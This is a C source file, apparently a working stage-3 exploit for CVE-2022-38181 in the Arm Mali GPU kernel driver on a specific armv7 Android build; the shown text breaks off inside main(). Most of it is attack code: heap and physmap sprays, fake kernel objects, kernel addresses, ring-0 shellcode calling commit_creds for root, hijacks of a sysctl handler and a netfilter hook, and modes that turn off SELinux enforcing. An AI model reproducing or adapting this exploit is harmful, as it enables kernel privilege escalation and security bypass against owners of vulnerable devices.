/* CVE-2022-38181 stage-3: raw-byte reclaim via inotify event names.
 *
 * inotify_handle_event kmallocs (name_len + 0x1d) and queues the event with
 * the destination filename bytes at event+0x1c; name_len=60 -> kmalloc-96,
 * fully controlled +0x1c..0x57, held until read. One of them reclaims the
 * freed kbase_va_region slot; JIT_FREE runs kbase_jit_free on our fake ->
 * unlink writes: W1 *(N+4)=P ; W2 *(P+0)=N
 *
 * modes:
 *   pin  <mb>          benign oracle: P=uts nodename-4, check uname after
 *   root <mb>          weaponized: P=&kern_table[pid_max].proc_handler,
 *                      N=shellcode; trigger = read /proc/sys/kernel/pid_max
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/inotify.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <pthread.h>

#define KBASE_IOCTL_TYPE 0x80
#define BASE_UK_VERSION_MAJOR 11
#define BASE_UK_VERSION_MINOR 11
#define MEM_PROT (0xFUL)
#define BASE_MEM_DONT_NEED ((uint64_t)1 << 17)
#define BASE_JD_REQ_SOFT_JOB ((uint32_t)1 << 9)
#define BASE_JD_REQ_SOFT_JIT_ALLOC (BASE_JD_REQ_SOFT_JOB | 0x9)
#define BASE_JD_REQ_SOFT_JIT_FREE (BASE_JD_REQ_SOFT_JOB | 0xa)

struct version_check { uint16_t major; uint16_t minor; };
struct set_flags_s { uint32_t create_flags; };
struct job_submit_s { uint64_t addr; uint32_t nr_atoms; uint32_t stride; };
union mem_alloc_u {
	struct { uint64_t va_pages; uint64_t commit_pages; uint64_t extent; uint64_t flags; } in;
	struct { uint64_t flags; uint64_t gpu_addr; } out;
};
struct mem_jit_init_s { uint64_t va_pages; uint8_t max_allocations; uint8_t trim_level; uint8_t padding[6]; };
struct mem_flags_change_s { uint64_t gpu_va; uint64_t flags; uint64_t mask; };
struct atom_v2 {
	uint64_t jc;
	uint64_t udata[2];
	uint64_t extres_list;
	uint16_t nr_extres;
	uint16_t compat_core_req;
	uint8_t pre_dep[4];
	uint8_t atom_number;
	uint8_t prio;
	uint8_t device_nr;
	uint8_t pad1;
	uint32_t core_req;
};
struct jit_alloc_info {
	uint64_t gpu_alloc_addr;
	uint64_t va_pages;
	uint64_t commit_pages;
	uint64_t extent;
	uint8_t id;
	uint8_t bin_id;
	uint8_t max_allocations;
	uint8_t flags;
	uint8_t padding[2];
	uint16_t usage_id;
};

#define IOC(d, t, n, s) ((d) << 30 | (s) << 16 | (t) << 8 | (n))
#define IOCTL_VERSION_CHECK IOC(3, KBASE_IOCTL_TYPE, 0, 4)
#define IOCTL_SET_FLAGS IOC(1, KBASE_IOCTL_TYPE, 1, 4)
#define IOCTL_JOB_SUBMIT IOC(1, KBASE_IOCTL_TYPE, 2, 16)
#define IOCTL_MEM_ALLOC IOC(3, KBASE_IOCTL_TYPE, 5, 32)
#define IOCTL_MEM_JIT_INIT IOC(1, KBASE_IOCTL_TYPE, 14, 16)
#define IOCTL_MEM_FLAGS_CHANGE IOC(1, KBASE_IOCTL_TYPE, 23, 24)

/* exact-build statics (vmlinux 4.9.117-g08fe75b) */
#define S_FAKE_GPU_ALLOC 0xc118b7ecu   /* xfrm fake phy alloc: nents@+8=0 */
#define UTS_NODENAME     0xc110d561u   /* init_uts_ns.name.nodename */
#define SCRATCH_P        0xc118bd58u   /* xfrm zero word */
#define PIDMAX_HANDLER   0xc1113f3cu   /* kern_table[pid_max].proc_handler (entry+0x14!) */
#define SHPAGE           0x11111000u   /* shellcode page (NUL-free addr) */
#define SHENTRY          0x11111114u   /* 4-aligned entry; W1 clobbers +4 (skipped) */

#define NAMELEN 60
#define NTOGGL 64
#define MAXRENAMES 12000

#define LOG(...) do { char _b[512]; int _n = snprintf(_b, sizeof(_b), __VA_ARGS__); \
	fprintf(stderr, "%s", _b); fflush(stderr); logf_sync(_b); (void)_n; } while (0)


static int logfd = -1;
static void logf_sync(const char *buf)
{
	if (logfd < 0)
		logfd = open("/data/local/tmp/s3.log", O_WRONLY | O_CREAT | O_APPEND | O_SYNC, 0644);
	if (logfd >= 0) {
		write(logfd, buf, strlen(buf));
	}
}

/* physmap fake (ret2dir): all runtime bytes ours, valid in worker context.
 * vmalloc=496M cmdline → physmap ends ~0xc2080000; G must stay below.
 * The spray is built from kbase MEM_ALLOC pages (GFP_KERNEL → ZONE_NORMAL
 * → lowmem-resident + pinned → zram-immune), patterned via CPU mmap. */
#define PM_G   0xc154b2a4u   /* guessed physmap addr (NUL-free, < 0xc2080000) */
#define PM_SPRAY_MB 320
#define KBM_REGIONS 260

/* nf-weapon target (exact build): &init_net.nf ipv4-LOCAL_OUT entries cell.
 * init_net = 0xc1185040 (proven: sock_net inlined across ~1000 net refs;
 * ip_send_skb(net,...) called with this literal).  __ip_local_out reads
 * [net+0x58c] -> 0xc1185040+0x58c.  NOTE: 0xc1104548 is __stack_chk_guard,
 * NOT init_net (the earlier movw/movt histogram was polluted by canaries). */
#define HOOKS_PTR_ADDR 0xc11855ccu

/* hook payload: call commit_creds(&init_cred) in the sender's process context.
 * The physmap direct-map above kernel_x_end is MT_MEMORY_RW (XN), so we CANNOT
 * execute shellcode baked in the kbm pages -- but we can point fn at a real
 * kernel function.  fn(priv, skb, state) -> commit_creds(priv) with priv =
 * &init_cred.  init_cred proven via prepare_kernel_cred's !daemon branch
 * (r5=0xc1114f54, usage word == 4). */
#define COMMIT_CREDS 0xc014993cu
#define INIT_CRED    0xc1114f54u
#define ENFORCING_SETUP 0xc10257e8u /* __init enforcing_setup(char*) -> [0xc1213ea8] */
#define ZERO_GADGET  0xc01d503cu    /* mov r3,#0 ; str r3,[r0] ; bx lr */
#define ENFORCING_ADDR 0xc1213ea8u  /* selinux_state.enforcing (int) */
#define SAFE_FN      0xc0108c8cu   /* gadget: mov r0,#1 ; bx lr (probe) */
static uint32_t nf_fn = COMMIT_CREDS, nf_priv = INIT_CRED;
static int nf_chain;
static int nf_fakecred;
static int nf_selroot;              /* 2-packet: zero enforcing then rewrite entry */
static int nf_reg = -1;             /* kbm region aliasing G (for in-place rewrite) */
static uint32_t nf_pageoff;         /* page offset within that region */
static uint32_t fakecred_sid = 7;   /* SECINITSID_INIT */

/* ring-0 hookfn: hookfn(priv, skb, state) -> NF_ACCEPT */
static const uint32_t nf_code[] = {
	0xE92D4070,   /* push {r4,r5,r6,lr}                    */
	0xE30B47F0,   /* movw r4, #0xb7f0  (PM_PAGE+0x7f0 lo)  */
	0xE34C4154,   /* movt r4, #0xc154                     */
	0xE306500D,   /* movw r5, #0x600d                     */
	0xE346500D,   /* movt r5, #0x600d (marker)            */
	0xE5845000,   /* str r5, [r4]  <- hook-ran marker     */
	0xE3A00000,   /* mov r0, #0                            */
	0xE3094E3C,   /* movw r4, #0x9e3c                      */
	0xE34C4014,   /* movt r4, #0xc014 prepare_kernel_cred  */
	0xE12FFF34,   /* blx r4                                */
	0xE1A06000,   /* mov r6, r0                            */
	0xE309493C,   /* movw r4, #0x993c                      */
	0xE34C4014,   /* movt r4, #0xc014 commit_creds         */
	0xE1A00006,   /* mov r0, r6                            */
	0xE12FFF34,   /* blx r4                                */
	0xE3A00001,   /* mov r0, #1 (NF_ACCEPT)                */
	0xE8BD8070,   /* pop {r4,r5,r6,pc}                     */
};
#define NF_CODE_OFF  0x600   /* page-relative */
#define NF_ENTRY_OFF 0x700   /* page-relative fake nf_hook_entry */
#define NF_CELL_OFF  0x740   /* page-relative cell */
#define PM_PAGE      (PM_G & ~0xfffu)



static void logf_sync(const char *buf);

#define KBM_MAX 512
static char *kbm_cpu[KBM_MAX];
static int kbm_n;

/* scan every sprayed page for the W1 word (P at +0x744): proves the
 * reclaim AND reveals which page G landed on */
static int kbm_scan_for(uint32_t val, uint32_t *found_off)
{
	for (int i = 0; i < kbm_n; i++) {
		char *base = kbm_cpu[i];
		for (unsigned long pg = 0; pg < 512; pg++) {
			char *p = base + (pg << 12);
			if (*(volatile uint32_t *)(p + 0x744) == val) {
				*found_off = (uint32_t)(pg << 12);
				return i;
			}
		}
	}
	return -1;
}

static char *pm_base;
static size_t pm_size;

static void physmap_spray(void)
{
	size_t sz = (size_t)PM_SPRAY_MB << 20;
	char *base = mmap(NULL, sz, PROT_READ | PROT_WRITE,
			  MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	if (base == MAP_FAILED) {
		LOG("[-] physmap spray mmap: %s\n", strerror(errno));
		exit(1);
	}
	pm_base = base;
	pm_size = sz;
	/* template in EVERY page (offsets relative to page start; G&0xfff=0x2a4):
	 *   +0x2ac  nents        = 0
	 *   +0x2bc  evict.next   = G+0x18 (self)
	 *   +0x2c0  evict.prev   = G+0x18
	 *   +0x2dc  native.kctx  = K = G+0x100
	 *   +0x3a8  K->kbdev(+4) = D = G+0x200  (D+0x538 = page+0x9dc in-page)
	 * K+0x141c8/-0x1429c land ~20 pages up: sub-0 store (harmless) and a
	 * read that is zero with p ~= spray coverage */
	for (size_t off = 0; off < sz; off += 4096) {
		char *pg = base + off;
		*(volatile uint32_t *)(pg + 0x2ac) = 0;
		*(volatile uint32_t *)(pg + 0x2bc) = PM_G + 0x18;
		*(volatile uint32_t *)(pg + 0x2c0) = PM_G + 0x18;
		*(volatile uint32_t *)(pg + 0x2dc) = PM_G + 0x100;
		*(volatile uint32_t *)(pg + 0x3a8) = PM_G + 0x200;
	}
	LOG("[+] physmap spray: %dMB patterned, G=%#x\n", PM_SPRAY_MB, PM_G);
}

/* zram swap is ACTIVE on this device: pressure swaps spray pages out and
 * the physmap alias goes stale. Fault every page back in (pattern returns
 * with the page; physical placement may differ but content is identical) */
static void physmap_retouch(void)
{
	volatile uint32_t *p = (volatile uint32_t *)pm_base;
	size_t words = pm_size / 4096 * 1024;
	for (size_t i = 0; i < words; i += 1024)
		p[i] = p[i];
	LOG("[+] physmap spray retouched (%dMB resident again)\n", PM_SPRAY_MB);
}


static int fd;


static void kbm_spray(void)
{
	/* ring-0 shellcode baked at page+0x600 (entry: b +8 skips the word
	 * at +0x604 that W1 clobbers with P). Executed via the RWX physmap
	 * direct map — no ret2usr, safe in worker context. */
	static const uint32_t code[] = {
		0xEA000000,   /* +0x600: b +8                          */
		0x00000000,   /* +0x604: W1 clobber (P lands here)     */
		0xE92D4070,   /* push {r4,r5,r6,lr}                    */
		0xE3A00000,   /* mov r0, #0                            */
		0xE3094E3C,   /* movw r4, #0x9e3c                      */
		0xE34C4014,   /* movt r4, #0xc014 prepare_kernel_cred  */
		0xE12FFF34,   /* blx r4                                */
		0xE1A06000,   /* mov r6, r0                            */
		0xE309493C,   /* movw r4, #0x993c                      */
		0xE34C4014,   /* movt r4, #0xc014 commit_creds         */
		0xE1A00006,   /* mov r0, r6                            */
		0xE12FFF34,   /* blx r4                                */
		0xE3A00000,   /* mov r0, #0 (handler ret 0)            */
		0xE8BD8070,   /* pop {r4,r5,r6,pc}                     */
	};
	int done = 0;
	for (int i = 0; i < KBM_REGIONS; i++) {
		union mem_alloc_u ma;
		memset(&ma, 0, sizeof(ma));
		ma.in.va_pages = 512;   /* 2MB */
		ma.in.commit_pages = 512;
		ma.in.flags = MEM_PROT;
		if (ioctl(fd, IOCTL_MEM_ALLOC, &ma) != 0)
			break;
		char *cpu = mmap(NULL, 512UL << 12, PROT_READ | PROT_WRITE,
				 MAP_SHARED, fd, ma.out.gpu_addr);
		if (cpu == MAP_FAILED)
			break;
		for (unsigned long pg = 0; pg < 512; pg++) {
			char *p = cpu + (pg << 12);
			*(volatile uint32_t *)(p + 0x2ac) = 0;
			*(volatile uint32_t *)(p + 0x2bc) = PM_G + 0x18;
			*(volatile uint32_t *)(p + 0x2c0) = PM_G + 0x18;
			*(volatile uint32_t *)(p + 0x2dc) = PM_G + 0x100;
			*(volatile uint32_t *)(p + 0x3a8) = PM_G + 0x200;
			for (unsigned c = 0; c < sizeof(code) / 4; c++)
				*(volatile uint32_t *)(p + 0x600 + 4 * c) = code[c];
			/* nf-weapon: the kernel nf_iterate treats [init_net+0x58c]
			 * AS the nf_hook_ops pointer (it does NOT deref twice):
			 *   entry = [net+0x58c]; reads entry->{next@0, fn@0xc,
			 *   priv@0x14, prio@0x20}.
			 * So the fake entry must live AT the cell address
			 * PM_PAGE+NF_CELL_OFF.  W2 installs 0xc154b740 there and
			 * W1's *(next+4)=prev lands at +0x744 (unused padding).
			 * fn(priv, skb, state) -> commit_creds(&init_cred). */
			*(volatile uint32_t *)(p + NF_CELL_OFF + 0x00) = 0;         /* next */
			*(volatile uint32_t *)(p + NF_CELL_OFF + 0x0c) = nf_fn;     /* fn */
			*(volatile uint32_t *)(p + NF_CELL_OFF + 0x14) = nf_priv;   /* priv */
			*(volatile uint32_t *)(p + NF_CELL_OFF + 0x20) = 0x100;     /* priority */
			if (nf_fakecred) {
				/* fake struct cred at +0x400, fake task_security_struct
				 * at +0x500.  override_creds(&fake_cred) installs it as
				 * current->cred -> choose a SELinux SID that can act. */
				unsigned char *fc = (unsigned char *)(p + 0x400);
				memset(fc, 0, 0x180);
				*(volatile uint32_t *)(fc + 0x00) = 4;             /* usage */
				*(volatile uint32_t *)(fc + 0x30) = 0xffffffffu;   /* cap_permitted */
				*(volatile uint32_t *)(fc + 0x34) = 0x3fu;
				*(volatile uint32_t *)(fc + 0x38) = 0xffffffffu;   /* cap_effective */
				*(volatile uint32_t *)(fc + 0x3c) = 0x3fu;
				*(volatile uint32_t *)(fc + 0x40) = 0xffffffffu;   /* cap_bset */
				*(volatile uint32_t *)(fc + 0x44) = 0x3fu;
				*(volatile uint32_t *)(fc + 0x64) = PM_PAGE + 0x500; /* security */
				*(volatile uint32_t *)(fc + 0x68) = 0xc11144d0u;   /* user (root_user) */
				*(volatile uint32_t *)(fc + 0x6c) = 0xc111450cu;   /* user_ns */
				*(volatile uint32_t *)(fc + 0x70) = 0xc1114fd0u;   /* group_info */
				*(volatile uint32_t *)(p + 0x500) = fakecred_sid;  /* osid */
				*(volatile uint32_t *)(p + 0x504) = fakecred_sid;  /* sid */
			}
			if (nf_chain) {
				/* chain: entry1=enforcing_setup("0") returns 1 ->
				 * advance to entry2=commit_creds(&init_cred).
				 * SELinux off + root in one packet. */
				*(volatile uint32_t *)(p + NF_CELL_OFF + 0x00) = PM_PAGE + 0x780;
				*(volatile uint32_t *)(p + NF_CELL_OFF + 0x0c) = ENFORCING_SETUP;
				*(volatile uint32_t *)(p + NF_CELL_OFF + 0x14) = PM_PAGE + 0x840;
				*(volatile uint32_t *)(p + 0x780 + 0x00) = 0;
				*(volatile uint32_t *)(p + 0x780 + 0x0c) = COMMIT_CREDS;
				*(volatile uint32_t *)(p + 0x780 + 0x14) = INIT_CRED;
				*(volatile uint32_t *)(p + 0x780 + 0x20) = 0x100;
				*(volatile uint8_t  *)(p + 0x840) = '0';
				*(volatile uint8_t  *)(p + 0x841) = 0;
			}
		}
		kbm_cpu[kbm_n++] = cpu;
		done++;
		/* mapping kept alive: lets us self-diagnose the W1 write later */
	}
	LOG("[+] kbm spray: %d x 2MB lowmem pages patterned, G=%#x entry=%#x\n",
	    done, PM_G, PM_G + 0x600);
}

static long query_commit(uint64_t gpu_va)
{
	union mem_query_u {
		struct { uint64_t gpu_addr; uint64_t query; } in;
		struct { uint64_t value; } out;
	} q;
	memset(&q, 0, sizeof(q));
	q.in.gpu_addr = gpu_va;
	q.in.query = 1; /* COMMIT_SIZE */
	if (ioctl(fd, IOC(3, KBASE_IOCTL_TYPE, 6, 16), &q) != 0) {
		LOG("[q] ioctl err: %s\n", strerror(errno));
		return -1;
	}
	return (long)q.out.value;
}

static int submit_atom(struct atom_v2 *a)
{
	struct job_submit_s js = { (uint64_t)(uintptr_t)a, 1, sizeof(*a) };
	return ioctl(fd, IOCTL_JOB_SUBMIT, &js);
}

/* fake region fields at name offset (slot + 0x1c = name[0]):
 * name[8..11] initial_commit, name[20..23] cpu_alloc,
 * name[24..27] gpu_alloc, name[28..31] jit_node.next=N,
 * name[32..35] jit_node.prev=P, name[38] jit_bin_id=1 */
/* userspace fake-object region (no PAN: kernel derefs our pages inline
 * in the submit-ioctl context). All addresses NUL/slash-free so they can
 * live inside inotify event names. */
#define UFAKE_BASE 0x41400000u     /* 64MB RW mmap, zeroed */
#define U_CPUALLOC 0x41414141u     /* fake cpu_alloc: +8 (nents) = 0 */
#define U_GPUALLOC 0x41424344u     /* fake gpu_alloc (S) */
#define U_K        0x43454141u     /* fake kctx: +4 -> D, +0x141c8 atomics */
#define U_D        0x43464141u     /* fake kbdev: +0x538 atomics */

static void *ufake_prep(void)
{
	void *p = mmap((void *)UFAKE_BASE, 64u << 20, PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (p != (void *)UFAKE_BASE)
		return NULL;
	/* cpu_alloc: nents (+8) = 0 -> backed size 0, trim skipped */
	*(volatile uint32_t *)(U_CPUALLOC + 8) = 0;
	/* gpu_alloc (S): nents 0 (+8), empty evict_node (+0x18 self) */
	*(volatile uint32_t *)(U_GPUALLOC + 8) = 0;
	*(volatile uint32_t *)(U_GPUALLOC + 0x18) = U_GPUALLOC + 0x18;
	*(volatile uint32_t *)(U_GPUALLOC + 0x1c) = U_GPUALLOC + 0x18;
	/* S->kctx (+0x38) = K; K->kbdev (+4) = D; atomics land in our pages */
	*(volatile uint32_t *)(U_GPUALLOC + 0x38) = U_K;
	*(volatile uint32_t *)(U_K + 4) = U_D;
	/* everything else stays zero: K+0x1429c == 0 skips the mm-atomics,
	 * K+0x141c8 / D+0x538 are benign sub-0 stores in our mapping */
	return p;
}

static uint32_t S_VAL = S_FAKE_GPU_ALLOC;   /* brute-force candidate */

static void build_name(char *name, uint32_t n, uint32_t p)
{
	memset(name, 'A', NAMELEN);
	memcpy(name + 8,  "iiii", 4);            /* initial_commit (any >= 0) */
	memcpy(name + 12, "FLAG", 4);            /* flags */
	memcpy(name + 16, "EXTT", 4);            /* extent */
	memcpy(name + 20, &S_VAL, 4);            /* cpu_alloc -> S */
	memcpy(name + 24, &S_VAL, 4);            /* gpu_alloc -> S */
	memcpy(name + 28, &n, 4);
	memcpy(name + 32, &p, 4);
	name[36] = 'U';
	name[37] = 'U';
	name[38] = 0x01;   /* jit_bin_id */
	name[NAMELEN] = 0;
}

static int n_ifd;
static int ifds[4];
static char wdir[128];
static char tog[NTOGGL][2][NAMELEN + 1];
static char tog2[NTOGGL][NAMELEN + 1];

static int inotify_setup(void)
{
	/* clean previous runs' watch dirs - they accumulate and shift the
	 * boot-time slab/FS state, degrading reclaim odds */
	{
		char cmd[128];
		snprintf(cmd, sizeof(cmd), "rm -rf /data/local/tmp/.w*");
		system(cmd);
	}
	snprintf(wdir, sizeof(wdir), "/data/local/tmp/.w%d", (int)getpid());
	mkdir(wdir, 0755);
	for (int i = 0; i < NTOGGL; i++) {
		char path[256];
		snprintf(path, sizeof(path), "%s/%s", wdir, tog[i][0]);
		int t = open(path, O_CREAT | O_RDWR, 0644);
		if (t < 0) { LOG("[-] tog create: %s\n", strerror(errno)); return -1; }
		close(t);
	}
	for (int k = 0; k < 4; k++) {
		int ifd = inotify_init1(0);
		if (ifd < 0) { LOG("[-] inotify_init1: %s\n", strerror(errno)); return -1; }
		if (inotify_add_watch(ifd, wdir, IN_MOVED_TO | IN_CREATE | IN_DELETE) < 0) {
			LOG("[-] add_watch: %s\n", strerror(errno));
			return -1;
		}
		ifds[k] = ifd;
		n_ifd++;
	}
	return ifds[0];
}

static int spray_state[NTOGGL];
static volatile int spray_stop;
static volatile int spray_renames;
static int wave_parity;

/* cycle trigger types so consecutive events differ in mask and never
 * merge into the queue tail (inotify_merge collapses same mask+wd):
 * wave even: MOVED_TO + CREATE ; wave odd: MOVED_TO + DELETE */
static void spray_wave(void)
{
	char p[256];
	for (int i = 0; i < NTOGGL; i++) {
		int from = spray_state[i], to = from ^ 1;
		snprintf(p, sizeof(p), "%s/%s", wdir, tog[i][from]);
		char p2[300];
		snprintf(p2, sizeof(p2), "%s/%s", wdir, tog[i][to]);
		if (rename(p, p2) == 0) {
			spray_state[i] = to;
			spray_renames++;
		} else if (spray_renames == 0 && i == 0) {
			LOG("[!] rename failing: %s\n", strerror(errno));
		}
	}
	if ((wave_parity++ & 1) == 0) {
		/* CREATE payload-named scratch files (IN_CREATE, named) */
		for (int i = 0; i < NTOGGL; i++) {
			snprintf(p, sizeof(p), "%s/%s", wdir, tog2[i]);
			int t = open(p, O_CREAT | O_WRONLY | O_TRUNC, 0644);
			if (t >= 0) { close(t); spray_renames++; }
		}
	} else {
		/* DELETE them again (IN_DELETE, named) */
		for (int i = 0; i < NTOGGL; i++) {
			snprintf(p, sizeof(p), "%s/%s", wdir, tog2[i]);
			if (unlink(p) == 0) spray_renames++;
		}
	}
}

static void *spray_thread(void *arg)
{
	int cpu = (int)(intptr_t)arg;
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	sched_setaffinity(0, sizeof(set), &set);
	while (!spray_stop && spray_renames < MAXRENAMES)
		spray_wave();
	return NULL;
}

/* isolating experiment: commit-0 region trailing (same timing as events) */
static int mem_alloc_region(int pages_va, int pages_commit, uint64_t *out_va)
{
	union mem_alloc_u ma;
	memset(&ma, 0, sizeof(ma));
	ma.in.va_pages = pages_va;
	ma.in.commit_pages = pages_commit;
	ma.in.flags = MEM_PROT;
	if (ioctl(fd, IOCTL_MEM_ALLOC, &ma) != 0)
		return -1;
	*out_va = ma.out.gpu_addr;
	return 0;
}

#define RSPRAY_MAX 16384
static uint64_t rspray_va[RSPRAY_MAX];
static volatile int rspray_n;
static volatile int rspray_stop;

static void *rspray_thread(void *arg)
{
	int cpu = (int)(intptr_t)arg;
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	sched_setaffinity(0, sizeof(set), &set);
	while (!rspray_stop && rspray_n < RSPRAY_MAX) {
		uint64_t va;
		if (mem_alloc_region(0x40, 0, &va) == 0) {
			int idx = __sync_fetch_and_add(&rspray_n, 1);
			if (idx < RSPRAY_MAX)
				rspray_va[idx] = va;
			else
				break;
		} else {
			usleep(200);
		}
	}
	return NULL;
}

/* ---------------- shellcode ---------------- */

static void map_shellcode(void)
{
	void *p = mmap((void *)SHPAGE, 8192, PROT_READ | PROT_WRITE | PROT_EXEC,
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (p != (void *)SHPAGE) {
		LOG("[-] shellcode mmap: %s\n", strerror(errno));
		exit(1);
	}
	/* layout: entry at SHENTRY = base+0x114 (4-aligned, NUL-free addr):
	 *   +0x114: b +8 -> body at +0x11c (W1 clobbers the word at +0x118)
	 */
	*(volatile uint32_t *)(SHPAGE + 0x114) = 0xEA000000;
	/* body at +0x11c */
	volatile uint32_t *b = (volatile uint32_t *)(SHPAGE + 0x11c);
	const uint32_t body[] = {
		0xE92D4070,                    /* push {r4,r5,r6,lr}                */
		0xE3A00000,                    /* mov r0, #0                        */
		0xE3094E3C,                    /* movw r4, #0x9e3c                  */
		0xE34C4014,                    /* movt r4, #0xc014 prepare_kernel_cred */
		0xE12FFF34,                    /* blx r4                            */
		0xE1A06000,                    /* mov r6, r0                        */
		0xE309493C,                    /* movw r4, #0x993c                  */
		0xE34C4014,                    /* movt r4, #0xc014 commit_creds     */
		0xE1A00006,                    /* mov r0, r6                        */
		0xE12FFF34,                    /* blx r4                            */
		0xE3A00000,                    /* mov r0, #0 (handler ret 0)        */
		0xE8BD8070,                    /* pop {r4,r5,r6,pc}                 */
	};
	for (unsigned i = 0; i < sizeof(body) / 4; i++)
		b[i] = body[i];
	/* nf-hook shellcode at +0x200: identical but RETURNS NF_ACCEPT(1) so
	 * the packet is not dropped.  Runs in the sender's process context via
	 * ret2usr (no PAN/PXN on this non-LPAE armv7) -> current == our task. */
	volatile uint32_t *nb = (volatile uint32_t *)(SHPAGE + 0x200);
	const uint32_t nfbody[] = {
		0xE92D4070,                    /* push {r4,r5,r6,lr}                */
		0xE3A00000,                    /* mov r0, #0                        */
		0xE3094E3C,                    /* movw r4, #0x9e3c                  */
		0xE34C4014,                    /* movt r4, #0xc014 prepare_kernel_cred */
		0xE12FFF34,                    /* blx r4                            */
		0xE1A06000,                    /* mov r6, r0                        */
		0xE309493C,                    /* movw r4, #0x993c                  */
		0xE34C4014,                    /* movt r4, #0xc014 commit_creds     */
		0xE1A00006,                    /* mov r0, r6                        */
		0xE12FFF34,                    /* blx r4                            */
		0xE3A00001,                    /* mov r0, #1 (NF_ACCEPT)            */
		0xE8BD8070,                    /* pop {r4,r5,r6,pc}                 */
	};
	for (unsigned i = 0; i < sizeof(nfbody) / 4; i++)
		nb[i] = nfbody[i];
	/* user gadget at +0x300: mov r0,#1 ; bx lr (proves ret2usr exec) */
	*(volatile uint32_t *)(SHPAGE + 0x300) = 0xE3A00001;
	*(volatile uint32_t *)(SHPAGE + 0x304) = 0xE12FFF1E;
	LOG("[+] shellcode at %#x, entry %#x, nf %#x\n", SHPAGE, SHENTRY, SHPAGE + 0x200);
}

int main(int argc, char **argv)
{
	if (argc < 2) {
		LOG("usage: %s pin|root [mb]\n", argv[0]);
		return 1;
	}
	int drain = strstr(argv[1], "drain") == argv[1] || !strcmp(argv[1], "iso") || !strcmp(argv[1], "pmap") || !strcmp(argv[1], "mix") || !strcmp(argv[1], "root");
	int kill_at_evict = !strcmp(argv[1], "drain2") || !strcmp(argv[1], "drain3") || !strcmp(argv[1], "drain4") || !strcmp(argv[1], "drain5") || !strcmp(argv[1], "iso") || !strcmp(argv[1], "pmap") || !strcmp(argv[1], "mix") || !strcmp(argv[1], "iso2") || !strcmp(argv[1], "root") || !strcmp(argv[1], "nf");
	int stepped = !strcmp(argv[1], "drain4") || !strcmp(argv[1], "drain5") || !strcmp(argv[1], "iso") || !strcmp(argv[1], "pmap") || !strcmp(argv[1], "mix") || !strcmp(argv[1], "iso2") || !strcmp(argv[1], "root") || !strcmp(argv[1], "nf");
	int overlap_kill = !strcmp(argv[1], "drain5");
	int iso = !strcmp(argv[1], "iso") || !strcmp(argv[1], "iso2");
	int pmap = !strcmp(argv[1], "pmap") || !strcmp(argv[1], "mix") || !strcmp(argv[1], "iso2") || !strcmp(argv[1], "root") || !strcmp(argv[1], "nf");
	int mix = !strcmp(argv[1], "mix");
	int pin_cpu0 = !strcmp(argv[1], "drain3");
	int weapon = !strcmp(argv[1], "root") || !strcmp(argv[1], "nf");
	int pmb = argc > 2 ? atoi(argv[2]) : 700;
	int ndrain = (argc > 3 && argv[3][0] >= '0' && argv[3][0] <= '9') ? atoi(argv[3]) : 5000;

	/* drain3: whole lifecycle on cpu0 - the victim slab is allocated,
	 * drained-full, freed (by the cpu0 worker) and re-taken within one
	 * cpu's SLUB domain */
	if (pin_cpu0) {
		cpu_set_t set;
		CPU_ZERO(&set);
		CPU_SET(0, &set);
		if (sched_setaffinity(0, sizeof(set), &set) != 0)
			LOG("[!] pin cpu0 failed: %s\n", strerror(errno));
	}
	uint32_t n_val, p_val;

	int nfw = !strcmp(argv[1], "nf");
	if (nfw) {
		/* W2: *(init_net+0x58c) = cell (physmap); W1: *(cell+4) = P (our page) */
		n_val = PM_PAGE + NF_CELL_OFF;
		p_val = HOOKS_PTR_ADDR;
		nf_fn = SHPAGE + 0x200;    /* ret2usr: prepare_kernel_cred+commit_creds */
		nf_priv = 0;
		if (argc > 3 && !strcmp(argv[3], "probe")) {
			nf_fn = SAFE_FN;
			nf_priv = 0;
		} else if (argc > 3 && !strcmp(argv[3], "uprobe")) {
			nf_fn = SHPAGE + 0x300;   /* user mov r0,#1; bx lr */
			nf_priv = 0;
		} else if (argc > 3 && !strcmp(argv[3], "oc")) {
			nf_fn = 0xc0149744u;      /* override_creds */
			nf_priv = INIT_CRED;
		} else if (argc > 3 && !strcmp(argv[3], "chain")) {
			nf_chain = 1;             /* enforcing_setup("0") -> commit_creds */
		} else if (argc > 3 && !strcmp(argv[3], "fc")) {
			nf_fakecred = 1;
			nf_fn = 0xc0149744u;      /* override_creds(fake_cred) */
			nf_priv = PM_PAGE + 0x400;
			if (argc > 4) fakecred_sid = (uint32_t)strtoul(argv[4], NULL, 0);
		} else if (argc > 3 && !strcmp(argv[3], "selroot")) {
			/* packet 1: zero selinux_state.enforcing, then rewrite the
			 * fake entry via the retained CPU mapping and packet 2 roots */
			nf_selroot = 1;
			nf_fn = ZERO_GADGET;
			nf_priv = ENFORCING_ADDR;
		}
		map_shellcode();           /* unused in nf mode; harmless */
	} else if (weapon) {
		map_shellcode();           /* kept for reference; unused now */
		if (argc > 3 && !strcmp(argv[3], "diag")) {
			/* diagnostic: W1 hits nodename (visible), W2 hits handler */
			n_val = UTS_NODENAME - 4;
			p_val = PIDMAX_HANDLER;
			ndrain = 5000;
		} else if (argc > 3 && !strcmp(argv[3], "diag2")) {
			/* W2 hits &pid_max itself: readback proves entry liveness */
			n_val = UTS_NODENAME - 4;
			p_val = 0xc1114d7cu; /* &pid_max (entry->data) */
			ndrain = 5000;
		} else if (argc > 3 && !strcmp(argv[3], "diag3")) {
			/* W2 hits entry->data FIELD (not the global): if the live
			 * inode uses our entry, pid_max reads nodename-bytes-as-int */
			n_val = UTS_NODENAME;
			p_val = 0xc1113f2cu; /* &kern_table[pid_max].data */
			ndrain = 5000;
		} else {
			n_val = PM_G + 0x600;  /* physmap-baked ring0 shellcode entry */
			p_val = PIDMAX_HANDLER;
		}
	} else {
		n_val = UTS_NODENAME - 4;
		p_val = SCRATCH_P;
	}
	if (ufake_prep() == NULL) {
